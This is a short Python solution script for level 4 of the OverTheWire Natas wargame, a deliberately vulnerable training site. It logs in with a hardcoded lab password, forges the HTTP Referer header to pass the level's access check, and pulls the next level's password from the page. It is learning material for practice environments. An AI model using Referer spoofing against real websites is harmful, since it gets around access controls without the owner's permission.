import requests
import re

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()

response = session.get(url, auth=(username, password), headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})

content = response.text

flag = re.findall(r"The password for natas5 is (.*)", content)[0]

print(flag)